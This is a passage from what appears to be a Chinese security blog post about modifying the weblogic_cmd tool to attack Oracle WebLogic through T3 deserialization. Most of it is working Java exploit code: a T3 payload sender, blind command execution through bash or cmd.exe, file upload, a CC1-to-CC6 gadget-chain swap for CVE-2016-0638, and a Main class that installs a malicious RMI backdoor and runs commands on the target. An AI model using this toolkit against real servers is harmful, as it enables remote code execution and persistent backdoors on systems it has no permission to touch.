BytesOperation.hexStringToBytes(datas.toString());</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> headers.length + <span class="number">4</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hexLen</span> <span class="operator">=</span> Integer.toHexString(len);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">dataLen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hexLen.length() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; (<span class="number">8</span> - hexLen.length()); i++) &#123;</span><br><span class="line">                dataLen.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dataLen.append(hexLen);</span><br><span class="line">        s.getOutputStream().write(BytesOperation.hexStringToBytes(dataLen + datas.toString()));</span><br><span class="line">        s.getOutputStream().flush();</span><br><span class="line">        s.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最好用的地方，这个类用来发送t3协议，可以拿来当个工具类，基本的东西就这么多<br>WeblogicOption：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream.weblogic;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.supeream.Main;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.SerialDataGenerator;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Serializables;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebLogicOperation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">installRmi</span><span class="params">(String host, String port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = SerialDataGenerator.serialRmiDatas(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;install&quot;</span>&#125;);</span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unInstallRmi</span><span class="params">(String host, String port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = SerialDataGenerator.serialRmiDatas(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;uninstall&quot;</span>&#125;);</span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">blind</span><span class="params">(String host, String port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = SerialDataGenerator.serialRmiDatas(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;blind&quot;</span>, Main.cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>)&#125;);</span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">uploadFile</span><span class="params">(String host, String port, String filePath, <span class="type">byte</span>[] content)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = SerialDataGenerator.serialUploadDatas(filePath, content);</span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">blindExecute</span><span class="params">(String host, String port, String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;;</span><br><span class="line">        <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;os&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Main.cmdLine.getOptionValue(<span class="string">&quot;os&quot;</span>).equalsIgnoreCase(<span class="string">&quot;linux&quot;</span>)) &#123;</span><br><span class="line">                cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] payload = SerialDataGenerator.serialBlindDatas(cmds);</span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对应上文，进行payload选择处理的地方，就上面的<code>upload bind ...</code>几种选择</p>
<h1 id="CVE-2016-0638小改"><a href="#CVE-2016-0638小改" class="headerlink" title="CVE-2016-0638小改"></a>CVE-2016-0638小改</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>当时是在研究T3反序列化里用<code>StreamMessageImpl</code>去绕过黑名单进行二次反序列化发现的问题，因为搭建环境的时候自己十分的铸币，导致我用的jdk版本是8u202，一个比较高的版本，这个版本是用不了CC1的，而weblogic_cmd默认又是只能用CC1的，当时让我懵逼了一阵子</p>
<h2 id="小改造"><a href="#小改造" class="headerlink" title="小改造"></a>小改造</h2><p>调试一下流程就知道了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681304454037-3140e049-ad22-46d4-8647-e82af54d2b41.png#averageHue=%232e302a&clientId=ud9e6af5f-fd36-4&from=paste&height=383&id=u20c3b496&name=image.png&originHeight=479&originWidth=1305&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=957558&status=done&style=none&taskId=u0a16bc6e-88a8-4ed1-8e4e-b2c968de134&title=&width=1044" alt="image.png"><br>获取一系列的cmdline<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681311947389-b04fde28-a80b-4c7a-83fe-fda974e8e6e5.png#averageHue=%232b2c28&clientId=u2cafdb3c-faf1-4&from=paste&height=203&id=ud35d588f&name=image.png&originHeight=254&originWidth=1188&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=434322&status=done&style=none&taskId=u0a09b654-8acb-4e3f-b951-2f7a6fa44e5&title=&width=950.4" alt="image.png"><br>然后<code>executeBlind(host, port)</code>获取一下命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681311975883-e01294e3-0ea5-468f-896e-63768587deac.png#averageHue=%232e2e28&clientId=u2cafdb3c-faf1-4&from=paste&height=252&id=uab061852&name=image.png&originHeight=315&originWidth=1066&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=486302&status=done&style=none&taskId=u51bead51-4bbd-44ad-a61c-d55dedb16bd&title=&width=852.8" alt="image.png"><br>进入blindExecute主要生成payload逻辑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681312682767-06bf73af-c022-4a92-ab17-b4526430848a.png#averageHue=%232b2c28&clientId=u2cafdb3c-faf1-4&from=paste&height=306&id=u8ff75f93&name=image.png&originHeight=382&originWidth=1351&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=750666&status=done&style=none&taskId=u37b002c5-9647-4f0e-b7bc-a04b9f57cf4&title=&width=1080.8" alt="image.png"><br>serialBlindDatas开始搭链子<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681312701270-8b2b10dc-772f-493d-8bc2-837d9c0207b2.png#averageHue=%232e2e2b&clientId=u2cafdb3c-faf1-4&from=paste&height=129&id=u15a73706&name=image.png&originHeight=161&originWidth=1160&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=270951&status=done&style=none&taskId=ue86092e7-7380-4187-8c36-88deaee5976&title=&width=928" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681312710160-a640492e-b75e-4328-82a9-8392555ccbfb.png#averageHue=%232b2d29&clientId=u2cafdb3c-faf1-4&from=paste&height=473&id=u18d6abc9&name=image.png&originHeight=591&originWidth=1348&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1167205&status=done&style=none&taskId=udd78af52-2086-4587-8e32-ded21566e41&title=&width=1078.4" alt="image.png"><br>就这里本来是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">       <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) Reflections</span><br><span class="line">              .getFirstCtor(</span><br><span class="line">                      <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">              .newInstance(Override.class, lazyMap);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Map.class</span><br><span class="line">              .cast(Proxy.newProxyInstance(SerialDataGenerator.class.getClassLoader(),</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler));</span><br><span class="line">       </span><br><span class="line">       handler = (InvocationHandler) Reflections.getFirstCtor(</span><br><span class="line">              <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">              .newInstance(Override.class, mapProxy);</span><br><span class="line">       </span><br><span class="line">       <span class="type">Object</span> <span class="variable">_handler</span> <span class="operator">=</span> BypassPayloadSelector.selectBypass(hashMap);</span><br><span class="line">       <span class="keyword">return</span> Serializables.serialize(_handler);</span><br></pre></td></tr></table></figure>
<p>我改成了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">       <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       <span class="comment">// 初始化map 设置laymap</span></span><br><span class="line">       Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(innerMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">       TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">       innerMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">       factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       factory.set(lazymap,transformerChain);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">_handler</span> <span class="operator">=</span> BypassPayloadSelector.selectBypass(hashMap);</span><br><span class="line">       <span class="keyword">return</span> Serializables.serialize(_handler);</span><br></pre></td></tr></table></figure>
<p>就简单的改CC1改为CC6就好了。。</p>
<h1 id="RMI与Weblogic结合回显策略"><a href="#RMI与Weblogic结合回显策略" class="headerlink" title="RMI与Weblogic结合回显策略"></a>RMI与Weblogic结合回显策略</h1><p>昨天学了一种通过RMI回显Weblogic反序列化的方式，这个方法适用于目标不出网，往常我们都是直接内存马，但是RMI这个思路也很不错，通过让Weblogic服务端加载一个恶意的远程接口类并且同时将其绑定在RMI上，这样我们就可以通过请求这个远程接口，然后输出运行结果就好了</p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>我们一般都适用Weblogic_cmd工具去给他嗦一把的，但是这个东西说实在的，你说这个工具有吧，它确实有类似的，但不是我想要的demo<br>因此就涉及到一个如何拓展一个属于自己的工具包了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:.</span><br><span class="line">├─boogipop</span><br><span class="line">│  ├─payload</span><br><span class="line">│  ├─serial</span><br><span class="line">│  ├─ssl</span><br><span class="line">│  └─weblogic</span><br><span class="line">└─supeream</span><br><span class="line">    ├─payload</span><br><span class="line">    ├─serial</span><br><span class="line">    ├─ssl</span><br><span class="line">    └─weblogic</span><br></pre></td></tr></table></figure>
<p>树状图如上，其实东西很少就是个简单的小工具，其中boogipop和supeream就是2个工具包，supeream是原版的，另外一个就是我说的自定义的，那在这之前就得先解析一下都是做什么的，在一开始就解析完了，那假如想要创建一个自己的类，首先你的Main方法就得和它一样，对输入的cmdline进行处理，否则会抛出空指针异常的（踩坑了）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.boogipop.serial.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.boogipop.ssl.WeblogicTrustManager;</span><br><span class="line"><span class="keyword">import</span> com.boogipop.weblogic.T3ProtocolOperation;</span><br><span class="line"><span class="keyword">import</span> com.boogipop.weblogic.WebLogicOperation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.mozilla.classfile.DefiningClassLoader;</span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"><span class="keyword">import</span> weblogic.jndi.Environment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TYPE</span> <span class="operator">=</span> <span class="string">&quot;marshall&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; types = Arrays.asList(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;marshall&quot;</span>, <span class="string">&quot;collection&quot;</span>, <span class="string">&quot;streamMessageImpl&quot;</span>&#125;);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String version;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CommandLine cmdLine;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] bytes=&#123;your_evil_rmi_codes&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="comment">//tobytes();</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.allowCryptoJDefaultJCEVerification&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.allowCryptoJDefaultPRNG&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.SSL.ignoreHostnameVerification&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.TrustKeyStore&quot;</span>, <span class="string">&quot;DemoTrust&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Options</span> <span class="variable">options</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Options</span>();</span><br><span class="line">        options.addOption(<span class="string">&quot;H&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Remote Host[need set]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;P&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Remote Port[need set]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;C&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Execute Command[need set]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;T&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Payload Type&quot;</span> + types);</span><br><span class="line">        options.addOption(<span class="string">&quot;U&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;Uninstall rmi&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;B&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;Runtime Blind Execute Command maybe you should select os type&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;os&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Os Type [windows,linux]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;https&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;enable https or tls&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;shell&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;enable shell module&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;upload&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;enable upload a file&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;src&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;path to src file &quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;dst&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;path to dst file &quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;noExecPath&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;custom execute path&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;127.0.0&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">port</span> <span class="operator">=</span> <span class="string">&quot;7001&quot;</span>;</span><br><span class="line">            <span class="type">CommandLineParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultParser</span>();</span><br><span class="line">            cmdLine = parser.parse(options, args);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;H&quot;</span>)) &#123;</span><br><span class="line">                host = cmdLine.getOptionValue(<span class="string">&quot;H&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">HelpFormatter</span> <span class="variable">formatter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelpFormatter</span>();</span><br><span class="line">                formatter.printHelp(<span class="string">&quot;test&quot;</span>, options);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;P&quot;</span>)) &#123;</span><br><span class="line">                port = cmdLine.getOptionValue(<span class="string">&quot;P&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">                cmd = cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;T&quot;</span>)) &#123;</span><br><span class="line">                TYPE = cmdLine.getOptionValue(<span class="string">&quot;T&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;U&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;开始删除rmi实例&quot;</span>);</span><br><span class="line">                WebLogicOperation.unInstallRmi(host, port);</span><br><span class="line">                System.out.println(<span class="string">&quot;后门删除实例&quot;</span>);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;t3://&quot;</span> + host + <span class="string">&quot;:&quot;</span> + port;</span><br><span class="line">            <span class="comment">// 安装RMI实例</span></span><br><span class="line">            invokeRMI(host,port);</span><br><span class="line">            <span class="type">Environment</span> <span class="variable">environment</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Environment</span>();</span><br><span class="line">            environment.setProviderUrl(url);</span><br><span class="line">            environment.setEnableServerAffinity(<span class="literal">false</span>);</span><br><span class="line">            environment.setSSLClientTrustManager(<span class="keyword">new</span> <span class="title class_">WeblogicTrustManager</span>());</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> environment.getInitialContext();</span><br><span class="line">            <span class="type">ClusterMasterRemote</span> <span class="variable">remote</span> <span class="operator">=</span> (ClusterMasterRemote) context.lookup(<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用RMI实例执行命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> remote.getServerLocation(cmd);</span><br><span class="line">            System.out.println(res);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeRMI</span><span class="params">(String host,String port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(DefiningClassLoader.class),</span><br><span class="line">                <span 